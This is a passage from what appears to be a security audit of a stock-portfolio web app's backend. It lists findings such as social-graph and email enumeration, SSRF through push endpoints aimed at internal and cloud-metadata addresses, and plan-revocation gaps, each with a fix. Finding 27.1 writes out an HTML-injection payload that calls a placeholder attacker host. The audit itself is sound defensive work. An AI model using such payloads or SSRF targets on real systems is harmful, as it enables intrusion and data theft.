    const recentEvent = await prisma.milestoneEvent.findFirst({ ... });  // Query 1
    if (type === '52w_high') {
      const recentAth = await prisma.milestoneEvent.findFirst({ ... }); // Query 2
    }
    if (type === '52w_low') {
      const recentAtl = await prisma.milestoneEvent.findFirst({ ... }); // Query 3
    }
  }
}
```
With 100 tickers × 100 users × 4 types × up to 3 queries = up to 120K DB queries per scheduler run. Each is a `findFirst` with a compound WHERE clause (userId + ticker + eventType + createdAt range).

**The Consequence:** Scheduler run times scale quadratically with user count. At 1000 users, a single milestone check could take minutes and saturate the DB connection pool.

**The Fix:** Batch-fetch recent milestone events for all relevant user/ticker/type combinations in a single query, then check in-memory:
```typescript
const recentEvents = await prisma.milestoneEvent.findMany({
  where: {
    userId: { in: allUserIds },
    ticker: { in: allTickers },
    createdAt: { gte: cooldownCutoff },
  },
  select: { userId: true, ticker: true, eventType: true },
});
const cooldownSet = new Set(recentEvents.map(e => `${e.userId}-${e.ticker}-${e.eventType}`));
```

---

**Positives:** Both services are well-designed overall. Milestone service has proper ATH/ATL suppression logic (prevents redundant 52W alerts when ATH/ATL fires). Anomaly detection uses DB-based cooldowns (survive restarts). Dividend change detection includes YoY same-quarter comparison, ETF exclusion list, post-sell re-verification, and 7-day cooldown. Push notifications fire-and-forget (don't block event creation). Volume checks are batched in groups of 5. Perplexity analysis is cached per ticker per day.

---

---

## File 22: market.service.ts

**Audited**: 2026-03-01
**Role**: Market data layer — price quotes, candles (intraday/hourly/daily), stock details, ticker search. Wraps Polygon.io, Finnhub, and Yahoo Finance with caching and fallback chains.
**Lines**: ~681

### Finding 22.1 — External API data trusted without bounds validation

**Severity:** LOW
**Location:** `market.service.ts` (throughout — lines 40-66, 122-142, 190-210, 329-345, 474-486)

**The Problem:** All three external data sources (Polygon, Finnhub, Yahoo Finance) are trusted to return valid financial data. The service performs null checks (`q.close[i] != null`) but never validates that values are within reasonable bounds:
```typescript
// Line 54 — Yahoo response directly used, no bounds check
closes.push(q.close[i]);    // could be negative, NaN, or absurdly large
highs.push(q.high?.[i] ?? 0);
lows.push(q.low?.[i] ?? 0);
```
If any API returns corrupted data (API bug, data feed glitch, delisted stock with stale data), it flows directly into:
- Portfolio valuations (via `fetchPrices`)
- Chart data (via `fetchIntradayCandles`, `fetchHourlyCandles`)
- Stock details page (via `fetchStockDetails`)
- Leaderboard rankings (via `getDailyCandles` in leaderboard service)
- Anomaly detection thresholds

**The Consequence:** A single corrupted API response could show a user's portfolio value as $0 or $999B, trigger false anomaly alerts, distort leaderboard rankings, or display nonsensical chart data. Since this data drives investment decisions, corrupted values could mislead users.

**The Fix:** Add basic sanity checks on price data:
```typescript
function isValidPrice(p: number): boolean {
  return Number.isFinite(p) && p >= 0 && p < 1_000_000; // No stock > $999K
}
```

### Finding 22.2 — Hardcoded ETF reference data with stale values

**Severity:** LOW
**Location:** `market.service.ts:247-314`

**The Problem:** Approximately 40 ETFs have hardcoded financial data (AUM, expense ratio, P/E, dividend yield, beta) with the comment:
```typescript
// Values are approximate as of early 2026 — better than showing nothing.
// TODO: Replace with paid API data before public release.
```
These values are used as fallbacks when Finnhub returns nulls. They don't update automatically and will become increasingly inaccurate over time (AUM changes daily, P/E ratios shift quarterly, dividend yields change with payouts).

**The Consequence:** Users see stale financial metrics for popular ETFs, potentially affecting investment decisions. AUM and P/E values can shift by 20%+ in a year. The `TODO` comment suggests this was intended as temporary but hasn't been replaced.

**The Fix:** Either remove the hardcoded data (show null instead of stale values), add a "data as of" timestamp visible to users, or replace with a paid API source that provides accurate ETF metrics.

---

**Positives:** This is a well-structured data layer. All ticker values in Yahoo Finance URLs use `encodeURIComponent()` — no URL injection. Multi-tier fallback chain (Finnhub → Polygon → Yahoo) ensures data availability. Appropriate cache TTLs per data freshness needs (10s for real-time quotes, 24h for historical candles). `warmHoldingsCache` is capped at `MAX_WARM_TICKERS = 100` to bound startup work. Extended hours pricing correctly enriches regular session quotes. Volume batching (groups of 5) prevents API rate exhaustion. Division-by-zero checks on `previousClose` and `currentPrice` denominators.

---

---

## File 23: follow.service.ts + social.controller.ts

**Audited**: 2026-03-01
**Role**: Social graph (follow/unfollow), user profiles (IDOR-protected), user settings CRUD, user reporting, activity feed. `follow.service.ts` handles DB operations; `social.controller.ts` is the HTTP layer for `/users/:userId/*` routes.
**Lines**: ~84 (service) + ~425 (controller) = ~509 total
**Routes**: `users.routes.ts` — mix of `requireAuth`, `optionalAuth`, and unauthenticated endpoints.

### Finding 23.1 — `isFollowingHandler` enables social graph enumeration via query param

**Severity:** MEDIUM
**Location:** `social.controller.ts:66-80` + `users.routes.ts:29`

**The Problem:** The `isFollowingHandler` accepts `followerId` as a query parameter instead of deriving it from the authenticated user:
```typescript
// Route: optionalAuth, but handler doesn't use req.user at all
router.get('/:userId/is-following', optionalAuth, isFollowingHandler);

// Handler — typed as Request (not AuthRequest), ignores auth context
export async function isFollowingHandler(req: Request, res: Response): Promise<void> {
  const { userId } = req.params;                       // target user
  const followerId = req.query.followerId as string;   // arbitrary user ID from query
  const following = await isFollowing(followerId, userId);
  res.json({ following });
}
```
Anyone — authenticated or not — can check whether any arbitrary user A follows user B. The `optionalAuth` middleware runs but its result is never consumed.

**The Consequence:** An attacker can enumerate the entire social graph by iterating user IDs in both parameters. This reveals private social relationships (who follows whom) without any authentication. Combined with the public `/users/:userId/followers` endpoint (Finding 23.3), the full bidirectional graph is exposed.

**The Fix:** Use the authenticated user's ID instead of a query param:
```typescript
export async function isFollowingHandler(req: AuthRequest, res: Response): Promise<void> {
  const { userId } = req.params;
  const followerId = req.user?.userId;
  if (!followerId) { res.status(401).json({ error: 'Auth required' }); return; }
  const following = await isFollowing(followerId, userId);
  res.json({ following });
}
```
Update the route to `requireAuth` instead of `optionalAuth`.

### Finding 23.2 — `displayName` accepts unbounded, unvalidated input

**Severity:** MEDIUM
**Location:** `social.controller.ts:318`

**The Problem:** The `updateUserSettingsHandler` validates `region`, `holdingsVisibility`, `ytdBaselineValue`, and `bio` (sliced to 80 chars), but `displayName` passes through with zero validation:
```typescript
// bio has length limit:
if (bio !== undefined) userData.bio = typeof bio === 'string' ? bio.slice(0, 80) : null;

// displayName has NOTHING:
if (displayName !== undefined) userData.displayName = displayName;  // any type, any length
```
No type check (could be a number, object, or array), no length limit, no format validation. The entire endpoint lacks a Zod schema — each field is manually destructured from `req.body` with ad-hoc checks.

**The Consequence:** A user can set their `displayName` to a 100KB string, an object `{}`, or a string containing HTML/script tags. The oversized string bloats every response that includes user data (profiles, leaderboard, followers lists, activity feed). Non-string types may cause Prisma errors or unexpected serialization. If any frontend renders `displayName` with `dangerouslySetInnerHTML` or similar, it's XSS.

**The Fix:** Add a Zod schema for the entire settings update body, or at minimum validate displayName:
```typescript
if (displayName !== undefined) {
  if (typeof displayName !== 'string' || displayName.length > 50) {
    res.status(400).json({ error: 'displayName must be a string, max 50 chars' });
    return;
  }
  userData.displayName = displayName.trim();
}
```

### Finding 23.3 — Followers/following endpoints return unbounded results without pagination

**Severity:** LOW
**Location:** `social.controller.ts:82-104` + `follow.service.ts:42-66`

**The Problem:** Both `getFollowersHandler` and `getFollowingHandler` call service functions that use `findMany` with no `take` limit and no cursor pagination:
```typescript
// follow.service.ts:43-52
export async function getFollowers(userId: string) {
  const follows = await prisma.follow.findMany({
    where: { followingId: userId },
    include: { follower: { select: { id: true, username: true, displayName: true } } },
    orderBy: { createdAt: 'desc' },
    // No take/skip — returns ALL followers
  });
  return follows.map((f) => f.follower);
}
```
Additionally, both routes have no auth middleware (line 30-31 of `users.routes.ts`), so anyone can hit these endpoints for any user.

**The Consequence:** A popular user with 10K followers generates a massive JSON response on every request. Since these are public, unauthenticated endpoints with no rate limiter, an attacker can repeatedly request popular profiles to cause memory pressure and high DB load.

**The Fix:** Add `take: 100` default limit with cursor-based pagination, and apply a read rate limiter to these public endpoints:
```typescript
const followers = await prisma.follow.findMany({
  where: { followingId: userId },
  take: 100,
  ...(cursor ? { cursor: { id: cursor }, skip: 1 } : {}),
  // ...
});
```

---

**Positives:** The controller demonstrates strong IDOR protection throughout. `getProfileHandler` correctly denies access to private profiles for non-owners (line 140). `getUserSettingsHandler` and `updateUserSettingsHandler` both verify `viewerId === userId` before allowing access. `updateRegionHandler` has its own ownership check. `reportUserHandler` properly uses Zod validation via `reportUserBodySchema`. The `followUser` service has self-follow prevention. `bio` is properly bounded to 80 characters. `getProfileHandler` correctly uses `optionalAuth` to allow public profile viewing while still enriching with viewer context. `getFeedHandler` requires auth and caps results at 50. Follow/unfollow actions use `mutationLimiter`.

---

---

## File 24: push.service.ts + push.controller.ts

**Audited**: 2026-03-01
**Role**: Web Push notification delivery. `push.service.ts` handles VAPID configuration, subscription persistence (upsert/delete), and sending push notifications via `web-push` library. `push.controller.ts` provides HTTP handlers for subscribe/unsubscribe/test/vapid-key endpoints.
**Lines**: ~135 (service) + ~130 (controller) = ~265 total
**Routes**: `push.routes.ts` — `GET /vapid-key` (public), `POST /subscribe` + `DELETE /subscribe` (auth + mutationLimiter), `POST /test` (auth only).

### Finding 24.1 — No per-user subscription limit allows push amplification

**Severity:** MEDIUM
**Location:** `push.service.ts:36-57` + `push.controller.ts:12-53`

**The Problem:** There is no limit on how many push subscriptions a single user can register. The `saveSubscription` function upserts by `endpoint` (so the same endpoint won't duplicate), but a malicious user can register thousands of unique, fabricated endpoints:
```typescript
// push.service.ts — upserts by endpoint, no cap on total per user
export async function saveSubscription(userId: string, subscription: SubscriptionInput): Promise<void> {
  await prisma.pushSubscription.upsert({
    where: { endpoint: subscription.endpoint },
    // ... no check: "does this user already have N subscriptions?"
  });
}
```
When `sendPushToUser` is called (triggered by price alerts, milestones, anomalies, etc.), it fetches ALL subscriptions and fires `Promise.allSettled` against all of them simultaneously:
```typescript
// push.service.ts:88 — fetches ALL, no limit
const subscriptions = await prisma.pushSubscription.findMany({ where: { userId } });
// Line 103 — fires HTTP requests to ALL endpoints concurrently
const results = await Promise.allSettled(
  subscriptions.map(sub => webpush.sendNotification(/* ... */)),
);
```

**The Consequence:** A user with 10,000 registered endpoints causes 10,000 concurrent outbound HTTP requests every time a single notification event fires. This exhausts the server's connection pool and available sockets. Since notification events fire from schedulers (milestones, anomalies, price alerts), the amplification is automatic and ongoing — the attacker just registers endpoints once and every future event triggers the flood.

**The Fix:** Cap subscriptions per user (e.g., 5 devices is generous):
```typescript
const MAX_SUBSCRIPTIONS_PER_USER = 5;
const existing = await prisma.pushSubscription.count({ where: { userId } });
if (existing >= MAX_SUBSCRIPTIONS_PER_USER) {
  throw new Error('Maximum push subscriptions reached');
}
```

### Finding 24.2 — Endpoint URL not validated — SSRF via web-push

**Severity:** MEDIUM
**Location:** `push.controller.ts:31-34` + `push.service.ts:105-108`

**The Problem:** The `subscribeHandler` validates that `endpoint` is a string under 2048 chars, but does not validate that it's a legitimate push service URL. The Web Push protocol (RFC 8030) mandates HTTPS endpoints from browser push services (FCM, Mozilla, Apple), but this app does not enforce scheme or domain:
```typescript
// push.controller.ts:31 — only type + length check
if (typeof subscription.endpoint !== 'string' || subscription.endpoint.length > MAX_ENDPOINT_LENGTH) {
  // No URL format check, no scheme check, no domain allowlist
}
```
The `web-push` library makes an HTTP POST to whatever URL is in `endpoint`. While `web-push` likely enforces HTTPS, an attacker can still register `https://internal-service.railway.internal:8080/admin` or `https://169.254.169.254/...` as their endpoint.

**The Consequence:** The server becomes an SSRF proxy — every notification event triggers outbound requests to attacker-controlled URLs from the server's network context. In Railway's infrastructure, this could reach internal services, metadata endpoints, or other private network resources. Combined with Finding 24.1 (no subscription limit), the attacker can target multiple internal hosts simultaneously.

**The Fix:** Validate endpoint URLs against a push service domain allowlist:
```typescript
const PUSH_DOMAINS = ['fcm.googleapis.com', 'updates.push.services.mozilla.com', 'web.push.apple.com'];
const url = new URL(subscription.endpoint);
if (url.protocol !== 'https:' || !PUSH_DOMAINS.some(d => url.hostname.endsWith(d))) {
  res.status(400).json({ error: 'Invalid push endpoint domain' });
  return;
}
```

### Finding 24.3 — `/push/test` endpoint has no rate limiter

**Severity:** LOW
**Location:** `push.routes.ts:16`

**The Problem:** The test push endpoint uses `requireAuth` but not `mutationLimiter`:
```typescript
router.post('/test', requireAuth, testPushHandler);           // No rate limiter
// Compare to:
router.post('/subscribe', mutationLimiter, requireAuth, ...); // Has rate limiter
```

**The Consequence:** An authenticated user can spam `POST /push/test` in a tight loop, triggering unlimited outbound web-push HTTP requests (one per registered subscription per call). Combined with Finding 24.1, this magnifies into a self-inflicted DoS on outbound connections.

**The Fix:** Add `mutationLimiter` to the test route:
```typescript
router.post('/test', mutationLimiter, requireAuth, testPushHandler);
```

---

**Positives:** The push system is well-designed for its core purpose. VAPID configuration is guarded by `pushEnabled` flag — push doesn't initialize if keys are missing. `subscribeHandler` has thorough input validation (type checks, length limits on endpoint and keys). `removeSubscription` correctly enforces userId ownership (findFirst with both endpoint AND userId). Auto-cleanup of expired subscriptions on 410/404 prevents stale endpoint accumulation. `sendPushToUser` is properly fire-and-forget (try-catch, never throws) so push failures don't block notification event creation. The `endpoint` field has `@unique` in Prisma, preventing duplicate registrations. Subscribe and unsubscribe routes both use `mutationLimiter`. The public `/vapid-key` endpoint correctly returns only the public key.

---

---

## File 25: waitlist.routes.ts

**Audited**: 2026-03-01
**Role**: Beta waitlist gate — public join endpoint, admin list/approve/reject endpoints. All logic is inline in the routes file (no separate service or controller). Admin authorization via `isWaitlistAdmin()` checking config-defined user IDs and verified emails.
**Lines**: ~125
**Routes**: `POST /join` (public + `waitlistJoinLimiter`), `GET /` (auth + admin), `POST /:id/approve` (auth + admin), `POST /:id/reject` (auth + admin).

### Finding 25.1 — Email enumeration via `/join` response

**Severity:** MEDIUM
**Location:** `waitlist.routes.ts:31-36`

**The Problem:** The public `/join` endpoint reveals whether an email address is already registered as a user account:
```typescript
const existingUser = await prisma.user.findUnique({ where: { email: normalizedEmail } });
if (existingUser) {
  res.json({ success: true, status: 'approved', alreadyRegistered: true });
  return;
}
```
The response differentiates three cases with distinct signatures:
- Email has an account → `{ status: 'approved', alreadyRegistered: true }`
- Email already on waitlist → `{ status: 'pending' }` or `{ status: 'approved' }` (no `alreadyRegistered`)
- Email never seen → `{ status: 'pending' }` (creates new entry)

**The Consequence:** An attacker can probe the `/join` endpoint with email addresses to determine which ones have registered accounts. The `waitlistJoinLimiter` limits to 5 requests/hour per IP in production, but with IP rotation (proxies, cloud functions), an attacker can enumerate at scale. The resulting list of confirmed emails enables targeted credential stuffing against `/auth/login` or social engineering.

**The Fix:** Return a uniform response regardless of account status:
```typescript
// Always return the same response — don't reveal account existence
const existingUser = await prisma.user.findUnique({ where: { email: normalizedEmail } });
if (existingUser) {
  res.json({ success: true, message: 'If this email is eligible, you will receive an update.' });
  return;
}
```

### Finding 25.2 — Admin list endpoint returns unbounded results

**Severity:** LOW
**Location:** `waitlist.routes.ts:62-77`

**The Problem:** The admin `GET /` endpoint returns ALL waitlist entries with no pagination:
```typescript
const entries = await prisma.waitlist.findMany({ where, orderBy: { createdAt: 'asc' } });
res.json({
  entries,                                                    // ALL entries
  total: entries.length,
  approved: entries.filter(e => e.status === 'approved').length,  // in-memory filter
  pending: entries.filter(e => e.status === 'pending').length,    // in-memory filter
});
```
The counts are computed by filtering the full array in-memory instead of using `prisma.waitlist.count()`. With 100K waitlist entries, this loads all records into memory and iterates the array twice.

**The Consequence:** At scale, this endpoint becomes a memory bomb for admin users. The JSON response itself could be tens of MB. Since it's admin-only, the blast radius is limited, but a compromised admin token could use this as a DoS vector.

**The Fix:** Add `take`/`skip` pagination and use `count()` for aggregates:
```typescript
const [entries, total, approved, pending] = await Promise.all([
  prisma.waitlist.findMany({ where, orderBy: { createdAt: 'asc' }, take: 50, skip }),
  prisma.waitlist.count({ where }),
  prisma.waitlist.count({ where: { status: 'approved' } }),
  prisma.waitlist.count({ where: { status: 'pending' } }),
]);
```

---

**Positives:** The waitlist system is well-designed for its purpose. The `waitlistJoinLimiter` (5/hour per IP in production) prevents brute-force signups. Email normalization (`trim().toLowerCase()`) prevents duplicate entries. The join endpoint is idempotent — re-joining returns existing status without creating duplicates. Admin authorization is properly dual-gated: `requireAuth` middleware + `isWaitlistAdmin()` function check, with the email-based admin check correctly requiring `emailVerified: true` to prevent impersonation. The config correctly lowercases admin emails at parse time (line 120 of config). Waitlist gate is checked during both email/password registration (`auth.service.ts:460`) and OAuth flows (`oauth.controller.ts:33-39`). Approval emails are only sent to non-registered users (prevents confusion for already-registered accounts).

---

---

## File 26: Remaining Middleware — email-verification, mfa-assurance, creator, plan

**Audited**: 2026-03-01
**Role**: Four access-control middleware files governing email verification (AI feature gate), MFA step-up authentication (Plaid/sensitive ops), creator status/entitlement checks, and subscription plan tier enforcement.
**Lines**: ~20 (email-verification) + ~62 (mfa-assurance) + ~53 (creator) + ~62 (plan) + ~24 (guard service) = ~221 total

### Finding 26.1 — Plan middleware DB fallback is one-directional — revoked plans invisible until JWT expires

**Severity:** MEDIUM
**Location:** `plan.middleware.ts:34`

**The Problem:** The `requirePlan` middleware only falls back to the database when the JWT plan is *insufficient* for the required tier. When the JWT plan is equal to or above the required tier, the DB is never consulted:
```typescript
// Line 34 — DB check ONLY fires when JWT plan is too low
if (!req.user.plan || PLAN_LEVEL[userPlan] < PLAN_LEVEL[requiredPlan]) {
  const user = await prisma.user.findUnique({ ... });  // Re-check DB
  // ...
}
```
Scenario: User has `premium` plan → JWT issued with `plan: 'premium'` → user requests refund → webhook sets DB plan to `free` → user hits `requirePlan('pro')` route → JWT says `premium` ≥ `pro` → DB check skipped → access granted.

**The Consequence:** After a plan revocation (refund, cancellation, admin downgrade), the user retains full access to paid features for the remaining JWT lifetime (~15 minutes). For high-value features like Deep Research ($2-5/run), this window allows the user to burn API credits after their refund is processed.

**The Fix:** Always verify against DB for paid-tier routes, or add a revocation check:
```typescript
// Always hit DB for paid routes (plan > free)
if (PLAN_LEVEL[requiredPlan] > 0) {
  const user = await prisma.user.findUnique({ ... });
  userPlan = normalizePlan(user?.plan);
  planExpiresAt = user?.planExpiresAt ?? null;
}
```
Alternatively, maintain a short-lived revocation cache (Redis set of revoked user IDs) that the webhook populates and the middleware checks.

### Finding 26.2 — MFA assurance is user-level, not session-level

**Severity:** LOW
**Location:** `mfa-assurance.middleware.ts:39-45`

**The Problem:** The MFA step-up check looks for *any* recent MFA challenge completed by the user, regardless of which session or device triggered it:
```typescript
const recentChallenge = await prisma.mfaChallenge.findFirst({
  where: {
    userId: req.user.userId,
    usedAt: { gte: cutoff },       // Any challenge in last 30 min
    // No session/device filter
  },
});
```
If a user completes MFA on their phone (device A), a stolen session cookie on a different device (device B) also passes the MFA assurance check for the next 30 minutes.

**The Consequence:** A session hijacker can piggyback on the legitimate user's MFA completions. When the real user performs a sensitive operation (completing MFA), the attacker's session gains MFA-assured access to Plaid token exchange and other step-up-protected endpoints within the 30-minute window — exactly the operations MFA was meant to protect.

**The Fix:** Tie MFA challenges to sessions by storing the JWT `jti` or a session identifier in the `MfaChallenge` record, and filtering by it:
```typescript
const recentChallenge = await prisma.mfaChallenge.findFirst({
  where: {
    userId: req.user.userId,
    usedAt: { gte: cutoff },
    sessionId: req.user.jti,   // Only count this session's MFA
  },
});
```

### Finding 26.3 — System user bypass by username string instead of hardcoded ID

**Severity:** LOW
**Location:** `email-verification-guard.service.ts:17`

**The Problem:** The email verification bypass for the system user checks by mutable username instead of immutable user ID:
```typescript
// System user (no email) is always allowed
if (user?.username === '_system') {
  return;   // Bypass email verification
}
```
If any code path allows username changes (or if a new user could register with the `_system` username through a race condition or validation gap), they would bypass email verification for all AI features.

**The Consequence:** A user who somehow obtains the `_system` username gains access to all Perplexity/AI endpoints without verifying their email, bypassing the cost-protection gate designed to prevent anonymous abuse of paid AI APIs.

**The Fix:** Use the hardcoded system user ID instead of username:
```typescript
const SYSTEM_USER_ID = '237198da-612e-411c-9ef8-f267c887a9f1';
if (userId === SYSTEM_USER_ID) return;
```

---

**Positives:** These middleware files are well-structured and follow consistent patterns. `requirePlan` has a smart DB fallback for JWT plan lag — when the JWT shows insufficient plan, it re-checks the DB for upgrades (handles post-checkout latency). `normalizePlan` safely defaults unknown values to `free`. `requireMfaAssurance` correctly allows through when MFA is not enabled (opt-in model — doesn't punish users who haven't set up MFA). `requireCreator` properly checks `status === 'active'` (not just existence). `requireCreatorAccess` uses `getEntitlement()` for section-level access control rather than a simple boolean. `requireEmailVerifiedForAi` delegates to a dedicated guard service with a proper custom error class. All middleware consistently checks `req.user` before accessing properties.

---

---

## File 27: email.service.ts

**Audited**: 2026-03-01
**Role**: Outbound email layer via Resend. Sends OTP codes, email verification, password reset, waitlist approval/notification, and performance reports. In non-production, captures OTP codes in-memory for CI/smoke tests.
**Lines**: ~207

### Finding 27.1 — HTML injection in admin notification email via waitlist email address

**Severity:** MEDIUM
**Location:** `email.service.ts:154-159`

**The Problem:** The `sendWaitlistJoinNotificationEmail` function injects the waitlist email address directly into HTML without escaping:
```typescript
subject: `New Waitlist Signup: ${waitlistEmail}`,
html: `
  ...
  <p style="...">${waitlistEmail}</p>
  <p style="...">Joined at ${now} ET</p>
  ...
`,
```
The `waitlistEmail` originates from user input via `POST /waitlist/join`. The route validates it with a basic regex (`/^[^\s@]+@[^\s@]+\.[^\s@]+$/`) that permits HTML metacharacters. For example, `test<img/src=x/onerror=fetch('https://evil.com')>@evil.com` passes the regex and injects HTML into the admin's email.

**The Consequence:** When the admin opens the notification email, injected HTML executes in the email client's rendering context. Depending on the email client, this could:
- Render phishing content (fake login forms overlaid on the legitimate email)
- Load external images for open-tracking and IP disclosure
- Inject CSS to hide the legitimate email content and replace it with attacker-controlled content
- In clients that render active content, execute JavaScript

**The Fix:** HTML-escape user input before embedding in templates:
```typescript
function escapeHtml(s: string): string {
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}
// ...
<p style="...">${escapeHtml(waitlistEmail)}</p>
```

### Finding 27.2 — OTP code exposed in email subject line

**Severity:** LOW
**Location:** `email.service.ts:37`

**The Problem:** The `sendOtpEmail` function places the 6-digit verification code in the email subject:
```typescript
subject: `${code} is your Nala verification code`,
```

**The Consequence:** Email subjects are visible in lock screen notifications, notification banners, email client message lists, and email server logs — all without opening the email. A bystander can read the OTP from a lock screen notification. Email forwarding services and corporate email gateways log subject lines, making the code visible in plaintext logs.

**The Fix:** Move the code to the email body only:
```typescript
subject: 'Your Nala verification code',
```

---

**Positives:** The email service has excellent dev/production separation. The test endpoint (`/auth/test/verification-code`) is triple-gated: route only registered when `NODE_ENV !== 'production'`, handler checks `NODE_ENV === 'production'` → 404, and `getCapturedEmailVerificationCode` independently checks `NODE_ENV === 'production'` → null. `TEST_HELPER_KEY` header validation adds a fourth layer. `getResend()` throws in production if API key is missing (fail-closed). OTP codes generated server-side (not from user input) — no injection risk in code values. `sendPerformanceReport` HTML is generated server-side from portfolio data, not user input. Dev-mode captured codes have 10-minute TTL with cleanup on read.

---

---

## File 28: transaction.service.ts + referral.service.ts + report.service.ts

**Audited**: 2026-03-01
**Role**: Three small CRUD services. Transactions: deposit/withdrawal tracking. Referrals: referral code validation, processing, and stats. Reports: user-to-user reporting with rate limiting and dedup.
**Lines**: ~40 (transaction svc) + ~53 (transaction ctrl) + ~119 (referral svc) + ~38 (referral ctrl) + ~65 (report svc) = ~315 total

### Finding 28.1 — Public referral code validation enables username + displayName enumeration

**Severity:** MEDIUM
**Location:** `referral.service.ts:111-118` + `referral.routes.ts:8`

**The Problem:** The `GET /referral/validate/:code` endpoint is public (no auth) and has no rate limiter. Since referral codes are usernames, this endpoint is a username existence oracle that also reveals the user's `displayName`:
```typescript
// referral.service.ts:111-118 — returns displayName for valid codes
export async function validateReferralCode(code: string) {
  const user = await prisma.user.findUnique({
    where: { username: code },
    select: { displayName: true },
  });
  if (!user) return { valid: false };
  return { valid: true, displayName: user.displayName };  // PII leak
}

// referral.routes.ts:8 — no auth, no rate limiter
router.get('/validate/:code', validateReferralCodeHandler);
```

**The Consequence:** An attacker can enumerate all valid usernames and harvest display names (real names) by iterating through common username patterns. No authentication or rate limiting gates this. The harvested username→displayName mapping enables targeted social engineering. Combined with email enumeration (Finding 25.1), this builds a comprehensive user database.

**The Fix:** Add `apiLimiter` to the route and omit `displayName` from the response:
```typescript
router.get('/validate/:code', apiLimiter, validateReferralCodeHandler);
// Service:
return { valid: true }; // Don't reveal displayName
```

### Finding 28.2 — Referral stats handler accesses wrong property — broken endpoint

**Severity:** LOW
**Location:** `referral.controller.ts:9`

**The Problem:** The handler accesses `req.userId` instead of `req.user.userId`:
```typescript
export async function getReferralStatsHandler(req: Request, res: Response): Promise<void> {
  const userId = (req as any).userId;  // Wrong — should be (req as any).user?.userId
  if (!userId) {
    res.status(401).json({ error: 'Authentication required' });
    return;
  }
}
```
The `requireAuth` middleware sets `req.user = { userId, username, ... }`, not `req.userId`. So `(req as any).userId` is always `undefined`, and the handler always returns 401 — even for authenticated users.

**The Consequence:** The referral stats dashboard is completely non-functional. While not a direct security vulnerability, broken security-adjacent features (like referral tracking) erode trust and may mask abuse patterns.

**The Fix:** Use the standard pattern:
```typescript
const userId = (req as any).user?.userId;
```

### Finding 28.3 — Transactions endpoint returns unbounded results

**Severity:** LOW
**Location:** `transaction.service.ts:23-31`

**The Problem:** `getTransactions` uses `findMany` with no `take` limit. A user with thousands of deposit/withdrawal records gets all of them in a single JSON response:
```typescript
return prisma.transaction.findMany({
  where: { userId },
  orderBy: { date: 'desc' },
  // No take/skip
});
```

**The Consequence:** Users who import CSV trade histories with hundreds of deposit/withdrawal records generate large responses. Not exploitable by other users (auth-scoped), but causes unnecessary memory and bandwidth usage.

**The Fix:** Add `take: 100` with cursor-based pagination.

---

**Positives:** Transaction system is solid — Zod validation on all inputs (`addTransactionSchema` validates type enum, positive amount, valid date), ownership-scoped delete via `findFirst({ where: { id, userId } })`, auth required on all routes, mutation limiter on writes. Report service is exemplary — self-report prevention, 5/24h per-reporter rate limit, same-reporter+reported+reason dedup, Zod validation in the controller. Referral processing uses atomic `$transaction` with self-referral check and unique constraint protection. Recent referrals capped at `take: 10`.

---

---

## File 29: watchlist.service.ts + stock-follow.service.ts

**Audited**: 2026-03-01
**Role**: User-created watchlists (CRUD for lists + holdings + charts) and stock-following (follow/unfollow tickers, most-followed leaderboard). Watchlists include real-time pricing, performance data, and chart generation.
**Lines**: ~370 (watchlist svc) + ~308 (watchlist ctrl) + ~70 (stock-follow svc) + ~108 (stock-follow ctrl) = ~856 total

### Finding 29.1 — No limit on holdings per watchlist — API fan-out amplification

**Severity:** LOW
**Location:** `watchlist.service.ts:300-329`

**The Problem:** `addWatchlistHolding` has no cap on how many holdings a single watchlist can contain. While `createWatchlist` has plan-based limits (free = 1 watchlist), there's no per-watchlist holding cap:
```typescript
export async function addWatchlistHolding(watchlistId, userId, input) {
  const watchlist = await ensureWatchlistOwned(watchlistId, userId);
  // No check: "how many holdings already in this watchlist?"
  // ... creates/updates holding
}
```
When `getWatchlistDetail` is called for a watchlist with N holdings, it makes:
- 1 `fetchPrices(tickers)` call (batched, reasonable)
- N individual `fetchTickerPerf(ticker)` calls (each hitting Polygon API if not cached)
- 1 `fetchPERatios(tickers)` call (batched, reasonable)

**The Consequence:** A user adds 500 tickers to a single watchlist. The first `getWatchlistDetail` call triggers 500 uncached Polygon API requests, potentially exhausting the API rate limit for the entire application. Subsequent requests are cached (5-min TTL), but cache eviction restarts the flood.

**The Fix:** Cap holdings per watchlist:
```typescript
const holdingCount = await prisma.watchlistHolding.count({ where: { watchlistId } });
if (holdingCount >= 50) throw new PlanLimitError(50, 'max');
```

---

**Positives:** Both modules are exceptionally well-built — among the cleanest in the codebase. Watchlist service uses `ensureWatchlistOwned` consistently for all operations (IDOR protection via `findFirst({ where: { id, userId } })`). All controller handlers use Zod schemas for params AND bodies (`watchlistIdParamSchema`, `createWatchlistSchema`, `addWatchlistHoldingSchema`, etc.). Plan limit enforcement on watchlist creation. P2002 unique constraint handled gracefully (409 response). All routes require auth; all mutations use `mutationLimiter`. Stock-follow service normalizes symbols to uppercase and validates format with `isValidSymbol` (`/^[A-Z0-9.\-]{1,15}$/`). `getMostFollowedStocks` is properly bounded (`take: Math.min(limit, 500)`). Upsert on follow prevents duplicates. Performance data cached with 5-min TTL. Division-by-zero guards on all percentage calculations.

---

---

## File 30: settings.service.ts + screenshot-ocr.service.ts + activity.service.ts

**Audited**: 2026-03-01
**Role**: Global tracking settings (baseline, YTD, broker lifetime), portfolio screenshot OCR (Tesseract + Sharp), and social activity feed. Settings uses a global singleton model; OCR processes user-uploaded images; activity tracks holding changes for the social feed.
**Lines**: ~257 (settings svc) + ~302 (settings ctrl) + ~565 (OCR svc) + ~137 (activity svc) = ~1261 total

### Finding 30.1 — Global singleton `Settings` model — cross-user data corruption

**Severity:** HIGH
**Location:** `settings.service.ts` (entire file) + `settings.controller.ts:98-121, 123-159, 184-208, 231-242, 244-255`

**The Problem:** The `Settings` model uses a hardcoded singleton key (`id: 'default'`) shared by ALL users. Every tracking-related operation reads and writes the same global row:
```typescript
// settings.service.ts:33 — setBaseline writes to global row using one user's portfolio
const settings = await prisma.settings.upsert({
  where: { id: 'default' },        // GLOBAL — same row for all users
  update: {
    trackingStartDate: now,
    baselineTotalValue,              // From THIS user's portfolio
    baselineCashBalance,
  },
  // ...
});
```
Affected endpoints (ALL write to the same global row):
- `POST /settings/baseline` — sets baseline from one user's portfolio
- `POST /settings/broker-lifetime` — sets broker lifetime data
- `POST /settings/ytd` — sets YTD start equity
- `POST /settings/tracking/activate` — sets tracking start date
- `POST /settings/tracking/restart` — resets tracking

